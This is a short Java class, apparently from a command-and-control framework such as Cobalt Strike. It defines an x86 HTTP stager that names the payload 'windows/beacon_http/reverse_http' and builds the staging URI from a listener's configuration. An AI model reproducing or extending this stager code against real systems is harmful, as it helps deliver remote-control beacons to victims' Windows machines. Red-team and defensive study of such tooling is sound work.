package stagers;

import common.Listener;

public class BeaconHTTPStagerX86
        extends GenericHTTPStagerX86 {
    public BeaconHTTPStagerX86(Listener l) {
        super(l);
    }

    @Override
    public String payload() {
        return "windows/beacon_http/reverse_http";
    }

    @Override
    public String getURI() {
        return this.getConfig().getURI() + this.getConfig().getQueryString();
    }
}

